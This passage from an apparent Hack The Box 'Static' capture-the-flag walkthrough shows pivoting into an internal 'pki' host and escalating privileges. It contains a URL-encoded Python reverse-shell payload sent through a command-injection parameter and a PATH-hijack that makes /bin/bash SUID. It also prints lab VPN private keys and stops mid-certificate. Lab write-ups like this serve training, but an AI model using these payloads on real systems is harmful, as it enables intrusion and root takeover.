Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
batch mode: /usr/bin/ersatool create|print|revoke CN
```

To get a shell from **pki** I've uploaded the netcat binary to **web** host.

```console
elpollon@elpollon:~/HTB/Static/exploits$ cp /usr/bin/nc .
elpollon@elpollon:~/HTB/Static/exploits$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...

```

From the ssh session I put on listen on port 9999:

```console
www-data@web:/tmp$ wget http://172.30.0.9:9000/nc
--2021-12-08 22:56:30--  http://172.30.0.9:9000/nc
Connecting to 172.30.0.9:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34952 (34K) [application/octet-stream]
Saving to: ‘nc’

nc                  100%[===================>]  34.13K  94.9KB/s    in 0.4s    

2021-12-08 22:56:32 (94.9 KB/s) - ‘nc’ saved [34952/34952]
www-data@web:/tmp$ chmod +x nc
www-data@web:/tmp$ ./nc -nlvp 9999
listening on [any] 9999 ...

```

The ip of **web** host in **pki**'s network is **192.168.254.2**. I get the shell with this python payload url-encoded:
**python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'**


```
elpollon@elpollon:~/HTB/Static/exploits$ curl http://localhost/index.php?a=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.254.2%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

```console
www-data@web:/tmp$ ./nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 59116
/bin/sh: 0: can't access tty; job control turned off
$ hostname
pki
$
```

Now we are inside of **pki**, at this point I've made a tty treatment. Let's check printable characters of the binary **/usr/bin/ersatool** that generates the **.ovpn** files (I will omit some part of the output because is too long).

```console
www-data@pki:~/html$ strings /usr/bin/ersatool 
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
ersatool.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
```

**ersatool.c** could be the source code of **/usr/bin/ersatool**. Let's find it.

```console
www-data@pki:/$ find \-name ersatool.c 2>/dev/null
./usr/src/ersatool.c
```

In this script there is some functions that elevates to root privileges. Let's check the function **createCN** that do this.

```
//creates and prints new CN config file
void createCN(char *cn, int i){
	int devNull, sout, serr, pid, status, oid;
	char EASYRSA[50];
	char buffer[100];
	char CMD[100];
	char WD[50];
	
	memset(EASYRSA,0,sizeof(EASYRSA));
	strcat(EASYRSA,ERSA_DIR);
	strcat(EASYRSA,"/easyrsa");

	if(i==1){
		printf("create->CN=");
		fflush(stdout);
		memset(buffer,0,sizeof(buffer));
		read(0,buffer,sizeof(buffer));
	} 
	else { 
		memset(buffer,0,sizeof(buffer));
		strncat(buffer, cn, sizeof(buffer));
	}

	if(!strncmp("\n",buffer,1)) { return; }

	do{
		pid = vfork();
		if(pid==0){
			char *a[] = {EASYRSA,"build-client-full",strtok(basename(buffer),"\n"),"nopass","batch"};
			//forge the command string
			cleanStr(a[2]);
			sprintf(CMD,"%s %s %.20s %s %s",a[0],a[1],a[2],a[3],a[4]);
			sout=dup(STDOUT_FILENO);
			serr=dup(STDERR_FILENO);
			devNull=open("/dev/null",O_WRONLY);
			dup2(devNull,STDOUT_FILENO);
			dup2(devNull,STDERR_FILENO);
			setuid(0); //escalating privilges to generate required files
			chdir(ERSA_DIR);
			system(CMD);
			exit(0);
		} 
		dup2(sout,STDOUT_FILENO);
		dup2(serr,STDERR_FILENO);
		close(devNull);
		usleep(500000);
		integrateCN(buffer);

		if(i==1){
			printf("create->CN=");
			fflush(stdout);
			memset(buffer,0,sizeof(buffer));
			read(0,buffer,sizeof(buffer));
		}
	} while (strncmp("\n",buffer,1) && i==1);
}
```

To monitor processes while I call **createCN** function from the binary **/usr/bin/ersatool** I've made this bash script called **process.sh**.

```bash
#!/bin/bash

old_process=$(ps -eo command)
while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process") | grep -v "kworker"
  old_process=$new_process
done
```

I've encoded the code in base64 to paste it in **pki** host.

```console
elpollon@elpollon:~/HTB/Static/exploits$ cat process.sh | base64
IyEvYmluL2Jhc2gKCm9sZF9wcm9jZXNzPSQocHMgLWVvIGNvbW1hbmQpCndoaWxlIHRydWU7IGRv
CiAgbmV3X3Byb2Nlc3M9JChwcyAtZW8gY29tbWFuZCkKICBkaWZmIDwoZWNobyAiJG9sZF9wcm9j
ZXNzIikgPChlY2hvICIkbmV3X3Byb2Nlc3MiKSB8IGdyZXAgLXYgImt3b3JrZXIiCiAgb2xkX3By
b2Nlc3M9JG5ld19wcm9jZXNzCmRvbmUK
```

```console
www-data@pki:/tmp$ echo 'IyEvYmluL2Jhc2gKCm9sZF9wcm9jZXNzPSQocHMgLWVvIGNvbW1hbmQpCndoaWxlIHRydWU7IGRv
CiAgbmV3X3Byb2Nlc3M9JChwcyAtZW8gY29tbWFuZCkKICBkaWZmIDwoZWNobyAiJG9sZF9wcm9j
ZXNzIikgPChlY2hvICIkbmV3X3Byb2Nlc3MiKSB8IGdyZXAgLXYgImt3b3JrZXIiCiAgb2xkX3By' | base64 -d > process.sh
www-data@pki:/tmp$ chmod +x process.sh
```

In a separate reverse shell I've executed **ersatool** binary invoking **createCN** function while in the other I runned **process.sh** (The process to get a reverse shell is the same, I'll do on port 9998).

```console
www-data@pki:/$ ersatool
# create
create->CN=asd
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw
MjI3MTAxNjAxWjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3cwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDCA/rLO4l5goACROYshzlVowO7hAl+EDgAUof3VSph
1UF2OCCr2J2xpOkkWHKFPCTl+fCtLcxKZdb5zQBKhIvxJ3Tzqe18whu23aI8Imol
AQcqZcaSMTRXAp8HKsrxpXl8TtbZ2y4nAVR0YXAWOadSMQtmztiOgzDAP+FbqZQf
CnKBW+yxNxjlrD/VpVf/C9GnXDn+QH2ezoOYCid6+ANuiSTqks3FzEnUrwuVMgxp
MW94Sw/2d8WbUfD5DxKvyHObjDwwZn54ZNz8WEXzTfqTtFD1ghNsvVJgvsDmyMYh
7nDfRSxNc3cEY8FOVvvaA3BvPP06xVEz0GrJkfUNjyvFAgMBAAGjgY4wgYswHQYD
VR0OBBYEFKHag2AygX8bgBngIC3WYMil7YJUME8GA1UdIwRIMEaAFKHag2AygX8b
gBngIC3WYMil7YJUoRikFjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3eCFEfpmK1xyTkV
eLW4PNbEEu0X42CuMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgEGMA0GCSqGSIb3
DQEBCwUAA4IBAQAG/yziZ6ae3f//fsOmU0GBLwKzWGzQxdykHAwN6452Mt3FHT7A
0+aT+C9DWmx4r71PD8RIDI9eDdOu9RZ8VoutZuZrhca5SpLoGfIFnmveNzy0mcf7
a/AQCH/XSOr8+FkF6UGXUK80lylqe3R/1YXct3htZZEPuSBDdi6zPMrq4UaGCPkY
bOFXVZZA7KHkzt5F8ajGs7xbTNTarOsPjdhN75dMfnG1w8upw1DLb1LE8QTP00fQ
i0wzJtUvYetL96vt/mbo8AuYZmWWmOzm1mJLNn4UbhG65/mHfBWHduRy1YZeeiuI
qYSaD5L082aZQj/S+qfTgkRiT2nduN1pZURn
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            6d:9a:3b:b3:6a:e9:9b:7c:5b:f2:ad:9b:e1:b5:45:e8
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=static-gw
        Validity
            Not Before: Dec  9 00:24:27 2021 GMT
            Not After : Nov 15 00:24:27 2121 GMT
        Subject: CN=asd
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:c7:b5:dc:79:07:03:6a:f2:be:76:0a:e3:44:b0:
                    6d:56:be:d4:ef:04:d1:9d:14:6e:ed:4a:85:05:c1:
                    b5:82:17:58:32:df:4a:21:ed:b6:55:80:6c:24:9e:
                    a3:22:e0:d7:e9:94:83:d5:c8:7e:0a:ad:b3:3e:b9:
                    03:11:62:dc:9b:d0:4d:a5:6a:e0:de:63:de:1f:c0:
                    c8:26:0b:70:1d:d3:3e:b8:7c:51:80:2b:34:0b:bc:
                    35:71:00:52:3e:88:c0:b7:e9:bd:53:e2:f5:3d:82:
                    95:76:b7:d6:ed:f3:5c:61:31:bf:c4:52:e3:c7:3d:
                    37:25:5c:9c:80:30:6b:84:57:35:b1:c5:2b:a3:db:
                    d9:5e:ac:6a:a4:43:ff:5d:e0:5f:ef:9f:f6:47:cb:
                    70:de:a9:6a:dc:ef:6a:15:03:69:5f:ce:4d:31:9b:
                    3a:10:f3:76:0b:c6:e8:30:81:4d:09:e9:96:18:8c:
                    cb:45:7c:d1:f2:47:40:cf:dd:6f:45:9c:f5:4a:c4:
                    08:24:c9:ed:b9:5b:b9:1f:76:0c:bb:ec:9e:5e:a6:
                    a0:df:c3:fc:b1:d0:ea:80:e8:bf:b6:9b:3f:ab:50:
                    2d:d7:e9:96:aa:6d:26:f9:9f:72:21:1e:12:c2:32:
                    4c:8b:1d:90:a4:58:bb:03:8a:ac:2f:3c:49:9f:d1:
                    3e:cd
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                F2:DF:84:8F:97:D2:1A:4C:99:FC:6E:41:BE:1F:08:CF:EE:FE:1E:DD
            X509v3 Authority Key Identifier: 
                keyid:A1:DA:83:60:32:81:7F:1B:80:19:E0:20:2D:D6:60:C8:A5:ED:82:54
                DirName:/CN=static-gw
                serial:47:E9:98:AD:71:C9:39:15:78:B5:B8:3C:D6:C4:12:ED:17:E3:60:AE

            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Key Usage: 
                Digital Signature
    Signature Algorithm: sha256WithRSAEncryption
         a1:0c:7f:06:c3:da:c8:76:fb:e7:07:d0:ff:10:58:de:b5:ef:
         c5:7a:1f:8b:9c:f4:ae:5b:8a:33:f2:25:97:52:f5:3f:45:a3:
         77:a5:0c:70:7b:bc:dd:ee:f6:d1:9b:f3:d4:e0:2d:4b:67:5b:
         d0:f1:d9:aa:a6:f8:ab:22:d1:3b:a8:24:29:99:34:50:da:de:
         c1:15:13:56:59:db:d3:fb:8b:e6:55:6f:02:4a:f7:a2:48:ac:
         d2:4b:f0:27:8b:7a:cc:be:b8:fe:c7:0b:75:27:9e:61:f8:e7:
         09:32:3d:77:46:91:d4:37:4c:2f:56:03:00:c0:eb:cd:fc:e3:
         8a:cd:01:ee:8d:72:69:b7:c7:ca:27:b7:6e:30:f5:0b:c8:a4:
         84:ac:2b:1d:e6:39:38:7d:0f:f9:d5:b3:db:2b:f2:d7:e2:ac:
         fd:cd:b2:f3:3f:bb:02:bf:fa:cf:31:8c:bd:2a:5b:f8:30:46:
         fb:f4:a0:69:2f:cf:9e:28:12:1d:a7:d1:37:15:b9:1e:ec:43:
         e1:e6:2f:a4:b8:64:8d:58:a0:ca:36:20:02:67:7d:cb:91:85:
         af:f0:f3:a3:cf:83:bf:75:c9:5c:c5:be:7d:04:72:f2:6b:94:
         54:30:72:22:9b:37:f6:96:ad:66:dd:82:b1:f9:c7:dc:31:45:
         cf:45:5b:2a
-----BEGIN CERTIFICATE-----
MIIDTzCCAjegAwIBAgIQbZo7s2rpm3xb8q2b4bVF6DANBgkqhkiG9w0BAQsFADAU
MRIwEAYDVQQDDAlzdGF0aWMtZ3cwIBcNMjExMjA5MDAyNDI3WhgPMjEyMTExMTUw
MDI0MjdaMA4xDDAKBgNVBAMMA2FzZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAMe13HkHA2ryvnYK40SwbVa+1O8E0Z0Ubu1KhQXBtYIXWDLfSiHttlWA
bCSeoyLg1+mUg9XIfgqtsz65AxFi3JvQTaVq4N5j3h/AyCYLcB3TPrh8UYArNAu8
NXEAUj6IwLfpvVPi9T2ClXa31u3zXGExv8RS48c9NyVcnIAwa4RXNbHFK6Pb2V6s
aqRD/13gX++f9kfLcN6patzvahUDaV/OTTGbOhDzdgvG6DCBTQnplhiMy0V80fJH
QM/db0Wc9UrECCTJ7blbuR92DLvsnl6moN/D/LHQ6oDov7abP6tQLdfplqptJvmf
ciEeEsIyTIsdkKRYuwOKrC88SZ/RPs0CAwEAAaOBoDCBnTAJBgNVHRMEAjAAMB0G
A1UdDgQWBBTy34SPl9IaTJn8bkG+HwjP7v4e3TBPBgNVHSMESDBGgBSh2oNgMoF/
G4AZ4CAt1mDIpe2CVKEYpBYwFDESMBAGA1UEAwwJc3RhdGljLWd3ghRH6Zitcck5
FXi1uDzWxBLtF+NgrjATBgNVHSUEDDAKBggrBgEFBQcDAjALBgNVHQ8EBAMCB4Aw
DQYJKoZIhvcNAQELBQADggEBAKEMfwbD2sh2++cH0P8QWN6178V6H4uc9K5bijPy
JZdS9T9Fo3elDHB7vN3u9tGb89TgLUtnW9Dx2aqm+Ksi0TuoJCmZNFDa3sEVE1ZZ
29P7i+ZVbwJK96JIrNJL8CeLesy+uP7HC3UnnmH45wkyPXdGkdQ3TC9WAwDA6838
44rNAe6Ncmm3x8ont24w9QvIpISsKx3mOTh9D/nVs9sr8tfirP3NsvM/uwK/+s8x
jL0qW/gwRvv0oGkvz54oEh2n0TcVuR7sQ+HmL6S4ZI1YoMo2IAJnfcuRha/w86PP
g791yVzFvn0EcvJrlFQwciKbN/aWrWbdgrH5x9wxRc9FWyo=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDHtdx5BwNq8r52
CuNEsG1WvtTvBNGdFG7tSoUFwbWCF1gy30oh7bZVgGwknqMi4NfplIPVyH4KrbM+
uQMRYtyb0E2lauDeY94fwMgmC3Ad0z64fFGAKzQLvDVxAFI+iMC36b1T4vU9gpV2
t9bt81xhMb/EUuPHPTclXJyAMGuEVzWxxSuj29lerGqkQ/9d4F/vn/ZHy3DeqWrc
72oVA2lfzk0xmzoQ83YLxugwgU0J6ZYYjMtFfNHyR0DP3W9FnPVKxAgkye25W7kf
dgy77J5epqDfw/yx0OqA6L+2mz+rUC3X6ZaqbSb5n3IhHhLCMkyLHZCkWLsDiqwv
PEmf0T7NAgMBAAECggEAGSofR9jMY3OG8FTa4lLg1CdjqWKQDxz+BUR4kosgFe5f
HLnqG3Bao1d1SP/8Sm7Ohg5CtnN2/l140pR5gH1WkwOiZQ+cmik3WgTus2yJihiO
NKzlkCLhggELMtv5gQu2TPZU9vcIM+H6d2Ue3gjmQREFuvU+4mIiSsDqr3Rqd9hT
8jRLyK7xbsFz0SpZRkbdiw7J2eInFBCuvj0AgCzWVBTa59Zi0i/X3xuufG4ZYwIR
1Q4FTjtIGgLLuyZp7ZMRi9EnljBk0a9Pl265yv/mH6h9V8IcOsHbHkinI5VODrWn
yTflO/aQKjmRdycVzDLsS1XJZqIGvjdic88VYhZGgQKBgQD/VTQao3Xdc6n2tZej
gik38CDInYY/yqaTpHVVuDFGvXdnKB+NRj8bMM82MyqOa9r4A7i787wGlRfM+bnC
vxjyRRWiYVzCkLQHJYWfHCxDUIKgidcc3DSETOc9h81jNw1LlrRunYD6VHE/pbul
AIbdDi+Uh767+hx+2pe2IsaTsQKBgQDIO3NuOEzeyYB7akwO9VE7p5Hf1WwpAugI
DGcFwYe4Fr1a0xGSXKIQHYIH6zdwpgKQOGvTa0dy+SaYK6Iu+Y7D4NTLVyyYRvgh
3Tkd5mEmbjjtK3jPUL3CZL7QW63Bi6T0BZKzfnOkOED+MXZ8yGfHFjE7hnRB3adx
3b2Gfnpv3QKBgBgbx2use3iJb0boJoU9yP6LIc1PclmbnNbb9Gg/mAeB5EBNPY1t
UJAUr7wCYMZJ0McSMuMsRFiqwzCLc8q7mHNnqn9Giiek2hrCpDc9xcAlXfAik7kZ
4auMR1k79Vyk2hCFDkxTetYoGvlTgMA3qIQ+zqdLmerN1trzcNe1uOJBAoGBAJNa
3RoSKNAT7o/krFCdzMhgC4R0ZgLQdr3lkrOztxOM+JEsn9PchA/kB1uYiNZH9b75
JrESVCSSowp9of97/Mq+XRu/7burDtStH2mXr4s+tnoj8eZv/xZeWeawcXDsOdqz
d0DNIIGMPJhVAmPWgDkNZfHugwQuARpVGzMtRSGpAoGAdhvGHpHptiyAW8HCKtd1
tGkajaX7v7lMSowuIuVOiiw/nZOWiWm4ckQtJAj3yBbQrBCizwrY1H7Tizm/hyca
EiRtDGkDVP5zsL8h3oiTxAbdS2iEvekwJ1V0jsO9CdnefJJ0UAKjTZa0VMWZZ09L
jRTvU618QNCkAjJ7Nj+Ha1Q=
-----END PRIVATE KEY-----
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
09a194dc6aee4ae65459c682cc0b25e9
43e54d75dd1d83653ef04a67c65177da
98df768c86585611755082c6b06da8d9
21a4e3afd8d4537c3be9cf3c91a31ddd
157c9ff3f99c5f098ca8be7fe4e01435
86ac1e6b62d126d9f31bf603cd822e26
4a0dfdcb5aa5e66d97cd7b338e7dc07a
62a7691b4fc80830c169f27486f9f22e
4b71185dda7c5adac7ed55b80190dd35
3ec31228f556903d23dbf12d3928578d
c7fe5488d77ab72a0f50ae8d975af87e
ec0dbce0f9f7bf2c01aff9c9cf4fcc99
aaca4a1e81a0a240565c356cd33c6163
f7d986e0395ea90a439b176542a42009
2aafeb626aadb6abc35fa023426c9334
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
create->CN=
# exit
```

```console
www-data@pki:/tmp$ ./process.sh
26a27
> [sh]
27d26
< [sh]
26a27
> ersatool
26d25
< ps -eo command
27a27
> ps -eo command
27a28
> sh -c /usr/bin/ersatool create 
28d27
< sh -c /usr/bin/ersatool create 
26a27
> sh -c /usr/bin/ersatool create 
27a29
> sh -c /usr/bin/ersatool create 
27d26
< sh -c /usr/bin/ersatool create 
29d27
< sh -c /usr/bin/ersatool create 
27a28
> sh -c /usr/bin/ersatool create 
28d27
< sh -c /usr/bin/ersatool create 
27a28,30
> ersatool
> php-fpm: pool www
> sh -c /opt/easyrsa/easyrsa build-client-full asd nopass batch
27d26
< ps -eo command
29d27
< php-fpm: pool www
30a29,31
> /bin/sh /opt/easyrsa/easyrsa build-client-full asd nopass batch
> ps -eo command
> openssl version
31d30
< openssl version
29a30
> openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/asd.key.606yESK5QT -out /opt/easyrsa/pki/reqs/asd.req.gOOweQ1Db4 -nodes -batch
30d29
< openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/asd.key.606yESK5QT -out /opt/easyrsa/pki/reqs/asd.req.gOOweQ1Db4 -nodes -batch
31a31
> /bin/sh /opt/easyrsa/easyrsa build-client-full asd nopass batch
31d30
< /bin/sh /opt/easyrsa/easyrsa build-client-full asd nopass batch
29a30
> [easyrsa]
30d29
< [easyrsa]
31a31
> [sed]
29a30
> openssl ca -utf8 -in /opt/easyrsa/pki/reqs/asd.req -out /opt/easyrsa/pki/issued/asd.crt.bce8y473jX -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch
31d31
< [sed]
27,30c27
< ersatool
< sh -c /opt/easyrsa/easyrsa build-client-full asd nopass batch
< /bin/sh /opt/easyrsa/easyrsa build-client-full asd nopass batch
< openssl ca -utf8 -in /opt/easyrsa/pki/reqs/asd.req -out /opt/easyrsa/pki/issued/asd.crt.bce8y473jX -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch
---
> [ersatool] <defunct>
28a29
> sh -c /usr/bin/ersatool create 
29d28
< sh -c /usr/bin/ersatool create 
26,27d25
< ersatool
< [ersatool] <defunct>
26a27
> sh -c /usr/bin/ersatool create 
27d26
< sh -c /usr/bin/ersatool create 
```

The binary **openssl** is executed without using an absolute path while the function createCN is called, this could open the gates to a **path hijacking attack**. Let's create a **openssl** script that assigns SUID privileges to **/bin/bash** and export the **PATH** variable starting with **/tmp**.

```console
www-data@pki:/tmp$ echo -e '#!/bin/bash \nchmod u+s /bin/bash' > openssl
www-data@pki:/tmp$ chmod +x openssl
www-data@pki:/tmp$ PATH=/tmp:$PATH
www-data@pki:/tmp$ export PATH
```

Now let's execute **ersatool** binary and invoke **createCN** function.

```console
www-data@pki:/tmp$ ersatool
# create
create->CN=pwn
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw
MjI3MTAxNjAxWjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3cwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDCA/rLO4l5goACROYshzlVowO7hAl+EDgAUof3VSph
1UF2OCCr2J2xpOkkWHKFPCTl+fCtLcxKZdb5zQBKhIvxJ3Tzqe18whu23aI8Imol
AQcqZcaSMTRXAp8HKsrxpXl8TtbZ2y4nAVR0YXAWOadSMQtmztiOgzDAP+FbqZQf
CnKBW+yxNxjlrD/VpVf/C9GnXDn+QH2ezoOYCid6+ANuiSTqks3FzEnUrwuVMgxp
MW94Sw/2d8WbUfD5DxKvyHObjDwwZn54ZNz8WEXzTfqTtFD1ghNsvVJgvsDmyMYh
7nDfRSxNc3cEY8FOVvvaA3BvPP06xVEz0GrJkfUNjyvFAgMBAAGjgY4wgYswHQYD
VR0OBBYEFKHag2AygX8bgBngIC3WYMil7YJUME8GA1UdIwRIMEaAFKHag2AygX8b
gBngIC3WYMil7YJUoRikFjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3eCFEfpmK1xyTkV
eLW4PNbEEu0X42CuMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgEGMA0GCSqGSIb3
DQEBCwUAA4IBAQAG/yziZ6ae3f//fsOmU0GBLwKzWGzQxdykHAwN6452Mt3FHT7A
0+aT+C9DWmx4r71PD8RIDI9eDdOu9RZ8VoutZuZrhca5SpLoGfIFnmveNzy0mcf7
a/AQCH/XSOr8+FkF6UGXUK80lylqe3R/1YXct3htZZEPuSBDdi6zPMrq4UaGCPkY
bOFXVZZA7KHkzt5F8ajGs7xbTNTarOsPjdhN75dMfnG1w8upw1DLb1LE8QTP00fQ
i0wzJtUvYetL96vt/mbo8AuYZmWWmOzm1mJLNn4UbhG65/mHfBWHduRy1YZeeiuI
qYSaD5L082aZQj/S+qfTgkRiT2nduN1pZURn
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            56:6c:b5:da:7d:d4:f4:47:9c:9c:92:7a:a8:e9:e2:e0
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=static-gw
        Validity
            Not Before: Dec  9 00:35:53 2021 GMT
            Not After : Nov 15 00:35:53 2121 GMT
        Subject: CN=pwn
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:a9:c4:02:c3:4a:c2:22:33:06:08:67:07:f2:6e:
                    7e:87:50:93:29:45:4d:37:29:6b:40:f2:f1:f0:90:
                    51:5d:71:68:58:0b:76:5d:9c:39:3c:76:74:35:ce:
                    0f:34:7c:d3:d6:08:fa:26:06:10:d7:55:aa:09:41:
                    4e:2e:92:12:50:58:d2:da:3b:8e:7f:93:39:41:31:
                    9d:20:93:0f:8a:66:da:83:03:13:d1:dc:f0:cb:d5:
                    23:0f:c5:a1:13:0c:4d:b3:eb:ca:db:99:4d:1f:6c:
                    1a:3e:ab:93:01:6b:57:01:70:05:e7:50:9f:f2:d3:
                    a8:d4:01:a8:63:c2:dc:c7:03:d7:da:b6:6a:2c:73:
                    53:e2:75:7c:b9:70:af:06:4a:a5:e1:ab:bc:51:77:
                    99:d6:13:9e:2c:85:e0:c3:df:48:9e:c7:65:2c:68:
                    3f:2f:21:68:8a:79:c6:2b:ab:e8:c9:42:54:7b:49:
                    22:53:23:53:a7:25:38:69:ae:97:9e:06:ce:d1:25:
                    66:60:fa:3c:bd:3c:48:9c:05:0a:cc:97:c5:ee:f5:
                    cf:06:b5:4e:86:9b:6c:c2:13:50:23:b9:2a:84:89:
                    58:22:9e:67:31:dc:d0:11:ae:a5:49:4a:7f:d1:ed:
                    21:5e:e0:ef:6b:51:30:1b:33:e2:f8:4f:af:53:f1:
                    e8:89
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                4C:25:F1:C1:62:8E:7B:67:D6:76:EB:C0:7F:26:9F:B5:3C:0E:1E:D3
            X509v3 Authority Key Identifier: 
                keyid:A1:DA:83:60:32:81:7F:1B:80:19:E0:20:2D:D6:60:C8:A5:ED:82:54
                DirName:/CN=static-gw
                serial:47:E9:98:AD:71:C9:39:15:78:B5:B8:3C:D6:C4:12:ED:17:E3:60:AE

            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Key Usage: 
                Digital Signature
    Signature Algorithm: sha256WithRSAEncryption
         0c:34:1b:e7:3e:22:31:88:58:11:20:19:b5:a7:78:c8:0d:98:
         5f:82:3b:89:ba:24:c0:cf:e7:b4:17:ac:5c:db:9f:62:89:61:
         24:53:53:8a:b5:8b:e4:e9:6b:d8:6c:74:38:91:0c:ae:64:13:
         30:cf:93:b9:98:02:ee:df:3c:c3:e8:b1:e6:69:d5:3e:11:37:
         a3:e4:e2:25:24:0c:ec:2e:30:f4:65:2e:2b:21:d6:a0:bd:80:
         2f:22:f8:43:25:41:e7:49:f5:3b:d5:ab:cc:97:8e:33:f4:d3:
         96:a9:79:7e:d7:16:d1:0a:1e:6c:8c:11:19:5f:58:40:c3:cd:
         30:38:66:9c:85:32:97:7d:08:6b:4e:98:3e:07:92:17:5d:26:
         15:4f:bb:1b:c1:3b:18:86:76:1f:8e:a5:20:f1:2d:4d:31:1f:
         3b:5e:6f:d1:fd:1e:d3:69:c3:67:e7:0e:74:54:6a:33:2b:42:
         96:04:37:0b:42:61:86:94:8d:50:67:b8:cd:dc:0a:9a:c8:75:
         e3:52:83:ef:3d:f0:b8:60:75:3d:9e:0e:7c:be:c0:29:34:78:
         a4:44:08:e9:71:ca:06:71:16:e0:65:9b:1a:89:00:44:81:4f:
         4d:24:59:77:76:8f:58:b4:8d:0a:92:b8:70:15:86:be:3f:1b:
         64:f3:ee:03
-----BEGIN CERTIFICATE-----
MIIDTzCCAjegAwIBAgIQVmy12n3U9EecnJJ6qOni4DANBgkqhkiG9w0BAQsFADAU
MRIwEAYDVQQDDAlzdGF0aWMtZ3cwIBcNMjExMjA5MDAzNTUzWhgPMjEyMTExMTUw
MDM1NTNaMA4xDDAKBgNVBAMMA3B3bjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKnEAsNKwiIzBghnB/JufodQkylFTTcpa0Dy8fCQUV1xaFgLdl2cOTx2
dDXODzR809YI+iYGENdVqglBTi6SElBY0to7jn+TOUExnSCTD4pm2oMDE9Hc8MvV
Iw/FoRMMTbPrytuZTR9sGj6rkwFrVwFwBedQn/LTqNQBqGPC3McD19q2aixzU+J1
fLlwrwZKpeGrvFF3mdYTniyF4MPfSJ7HZSxoPy8haIp5xiur6MlCVHtJIlMjU6cl
OGmul54GztElZmD6PL08SJwFCsyXxe71zwa1ToabbMITUCO5KoSJWCKeZzHc0BGu
pUlKf9HtIV7g72tRMBsz4vhPr1Px6IkCAwEAAaOBoDCBnTAJBgNVHRMEAjAAMB0G
